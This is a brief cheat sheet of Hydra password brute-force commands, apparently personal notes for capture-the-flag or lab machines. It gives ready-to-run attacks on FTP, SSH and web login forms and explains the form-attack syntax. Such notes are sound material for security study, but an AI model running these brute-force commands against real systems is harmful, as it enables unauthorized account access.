# Hydra

hydra -l user -P passlist.txt ftp://MACHINE_IP

hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
- "/:XXXXX:F=YYYYY"
- XXXXX= post request with username e login
- YYYYY= word when request is failed

hydra -l lin -P locks.txt -u ssh://<box ip here>


